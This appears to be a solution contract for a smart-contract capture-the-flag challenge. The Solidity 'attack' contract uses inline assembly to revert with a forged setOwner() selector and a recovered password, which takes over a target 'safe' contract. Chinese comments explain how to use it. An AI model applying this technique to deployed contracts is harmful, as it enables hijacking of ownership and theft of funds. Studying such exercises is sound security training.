pragma solidity ^0.4.23;
import "./safe.sol";
contract attack{
    bytes public constant SEL = abi.encodeWithSignature("setOwner()");
    //攻击合约地址放入gift即可,sel为setOwner函数的函数选择器，val为查出的password
    function gift(address) public view {
        bytes4 sel =0x40caae06;
        bytes32 val = bytes32(0x2022);
        assembly {
            mstore(0, sel)
            mstore(0x4, val)
            revert(0, 0x24)
        }
    }
    //手动调isCompleted
    function complete(address _safe)public{
        safe(_safe).gift(address(this));
    }

}